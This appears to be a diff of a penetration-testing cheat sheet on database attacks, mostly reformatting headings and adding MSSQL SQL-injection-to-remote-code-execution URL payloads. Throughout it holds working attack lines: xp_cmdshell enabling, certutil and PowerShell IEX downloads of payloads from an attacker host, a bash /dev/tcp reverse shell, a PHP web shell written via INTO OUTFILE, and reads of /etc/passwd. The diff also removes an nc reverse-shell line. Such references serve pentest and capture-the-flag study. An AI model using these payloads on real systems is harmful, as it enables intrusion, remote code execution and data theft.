@@ -229,8 +229,6 @@ $ quit
 $ sudo systemctl start mysql.service
 ```
 
-### Update User Password
-
 > https://bcrypt-generator.com/
 
 ```c
@@ -250,18 +248,31 @@ mysql> UPDATE user set is_admin = 1 where name = "<USERNAME>";
 mysql> SELECT TO_BASE64(password) FROM accounts where id = 1;
 ```
 
-### Drop a Shell
-
-```c
-mysql> \! sh;
-mysql> \! /bin/sh;
-```
-
 ### Read a File
 
 ```c
 mysql> SELECT LOAD_FILE('/etc/passwd');
 mysql> SELECT CAST(LOAD_FILE('/etc/passwd') AS CHAR)\G;
+```
+
+### User Privilege Check
+
+```c
+mysql> SELECT group_concat(grantee, ":",privilege_type) FROM information_schema.user_privileges
+```
+
+### File Privilege Check
+
+```c
+mysql> SELECT file_priv FROM mysql.user WHERE user = 'netspi'
+mysql> SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee LIKE '%netspi%'
+```
+
+### Drop a Shell
+
+```c
+mysql> \! sh;
+mysql> \! /bin/sh;
 ```
 
 ### Insert Code to get executed
@@ -299,7 +310,7 @@ MariaDB [admirer]> create table <TABLE>(data VARCHAR(255));
 Query OK, 0 rows affected (0.008 sec)
 ```
 
-### Remote Access
+### Configure Remote Access
 
 ```c
 $ sudo vi /etc/mysql/mariadb.conf.d/50-server.cnf
@@ -364,7 +375,7 @@ SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import o
 #### Execute Script HTTP Server
 
 ```c
-$ xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LHOST>/<SCRIPT>.ps1\");"
+SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LHOST>/<SCRIPT>.ps1\");"
 ```
 
 #### Start xp_cmdshell via MSSQL
@@ -399,6 +410,20 @@ SQL> xp_cmdshell powershell -c import-module C:\PATH\TO\FILE\<FILE>.ps1; <FILE> 
 SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\",\"<PASSWORD>\");Import-Module C:\PATH\TO\FILE\<FILE>.ps1;<FILE> <OPTIONS>
 ```
 
+#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) in URL
+
+```c
+http://<RHOST>/index.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+```
+
+```c
+http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/<FILE>.exe C:\Windows\Temp\<FILE>.exe'; --
+```
+
+```c
+http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
+```
+
 ## mysqldump
 
 ```c
@@ -406,8 +431,6 @@ $ mysqldump --databases <DATABASE> -u<USERNAME> -p<PASSWORD>    // no space betw
 ```
 
 ## NoSQL Injection
-
-### Authentication Bypass
 
 ```c
 admin'||''==='
@@ -426,7 +449,7 @@ proxyDict = {
               "http"  : http_proxy,
             }
 
-url = "<DOMAIN>/?search=admin"
+url = "<RHOST>/?search=admin"
 
 done = False
 pos = 0
@@ -459,7 +482,7 @@ $ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 ### Common Commands
 
 ```c
-postgres=# l                         // list all databases
+postgres=# \l                        // list all databases
 postgres=# \list                     // list all databases
 postgres=# \c                        // use database
 postgres=# \c <DATABASE>             // use specific database
@@ -571,7 +594,7 @@ $ sqlcmd -S <RHOST> -U <USERNAME>
 $ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 ```
 
-## SQL Injection
+## SQL Injection (SQLi)
 
 > https://github.com/payloadbox/sql-injection-payload-list
 
@@ -842,7 +865,6 @@ admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password
 ```c
 $ ls -l&host=/var/www
 $ command=bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'%26host=
-$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
 ```
 
 ### SQL Truncation Attack
@@ -861,40 +883,28 @@ foobar" UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEM
 foobar" UNION SELECT 1, user, password, authentication_string FROM mysql.user; #
 ```
 
-### List of Tables
+### List Tables
 
 ```c
-$ UNION SELECT 1,table_name,3,4 FROM information_schema.tables;
+UNION SELECT 1,table_name,3,4 FROM information_schema.tables;
 ```
 
-### List of Columns
+### List Columns
 
 ```c
-$ UNION SELECT 1,column_name,3,4 FROM information_schema.columns;
+UNION SELECT 1,column_name,3,4 FROM information_schema.columns;
 ```
 
 ### Username and Password Fields
 
 ```c
-$ UNION SELECT 1,concat(login,':',password),3,4 FROM users;
+UNION SELECT 1,concat(login,':',password),3,4 FROM users;
 ```
 
 ### Example of UNION Injection with enumerating information_schema
 
 ```c
-$ SELECT group_concat(table_name,":",column_name,"\n") FROM information_schema.columns where table_schema = 'employees'
-```
-
-### MySQL User Privilege Check
-
-```c
-$ SELECT group_concat(grantee, ":",privilege_type) FROM information_schema.user_privileges
-```
-
-### MySQL File Read
-
-```c
-$ SELECT load_file('/etc/passwd')
+SELECT group_concat(table_name,":",column_name,"\n") FROM information_schema.columns where table_schema = 'employees'
 ```
 
 ### URL Encoded SQL Injection
@@ -925,13 +935,6 @@ SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'
 
 ```c
 SELECT LOAD_FILE(0x633A5C626F6F742E696E69)    // reads C:\boot.ini
-```
-
-### File Privileges
-
-```c
-SELECT file_priv FROM mysql.user WHERE user = 'netspi'
-SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee LIKE '%netspi%'
 ```
 
 ### Cipher Injection
@@ -1052,57 +1055,57 @@ from websocket import create_connection
 ws_server = "ws://localhost:8156/ws"
 
 def send_ws(payload):
-	ws = create_connection(ws_server)
-	# If the server returns a response on connect, use below line	
-	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
-	
-	# For our case, format the payload in JSON
-	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
-	data = '{"employeeID":"%s"}' % message
+  ws = create_connection(ws_server)
+  # If the server returns a response on connect, use below line 
+  #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
+  
+  # For our case, format the payload in JSON
+  message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
+  data = '{"employeeID":"%s"}' % message
 
-	ws.send(data)
-	resp = ws.recv()
-	ws.close()
+  ws.send(data)
+  resp = ws.recv()
+  ws.close()
 
-	if resp:
-		return resp
-	else:
-		return ''
+  if resp:
+    return resp
+  else:
+    return ''
 
 def middleware_server(host_port,content_type="text/plain"):
 
-	class CustomHandler(SimpleHTTPRequestHandler):
-		def do_GET(self) -> None:
-			self.send_response(200)
-			try:
-				payload = urlparse(self.path).query.split('=',1)[1]
-			except IndexError:
-				payload = False
-				
-			if payload:
-				content = send_ws(payload)
-			else:
-				content = 'No parameters specified!'
+  class CustomHandler(SimpleHTTPRequestHandler):
+    def do_GET(self) -> None:
+      self.send_response(200)
+      try:
+        payload = urlparse(self.path).query.split('=',1)[1]
+      except IndexError:
+        payload = False
+        
+      if payload:
+        content = send_ws(payload)
+      else:
+        content = 'No parameters specified!'
 
-			self.send_header("Content-type", content_type)
-			self.end_headers()
-			self.wfile.write(content.encode())
-			return
+      self.send_header("Content-type", content_type)
+      self.end_headers()
+      self.wfile.write(content.encode())
+      return
 
-	class _TCPServer(TCPServer):
-		allow_reuse_address = True
+  class _TCPServer(TCPServer):
+    allow_reuse_address = True
 
-	httpd = _TCPServer(host_port, CustomHandler)
-	httpd.serve_forever()
+  httpd = _TCPServer(host_port, CustomHandler)
+  httpd.serve_forever()
 
 
 print("[+] Starting MiddleWare Server")
 print("[+] Send payloads in http://localhost:8081/?id=*")
 
 try:
-	middleware_server(('0.0.0.0',8081))
+  middleware_server(('0.0.0.0',8081))
 except KeyboardInterrupt:
-	pass
+  pass
 ```
 
 #### Execution
@@ -1174,7 +1177,7 @@ $ sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
 1> EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
 ```
 
-## xpath injection
+## XPATH Injection
 
 ```c
 test' or 1=1 or 'a'='a
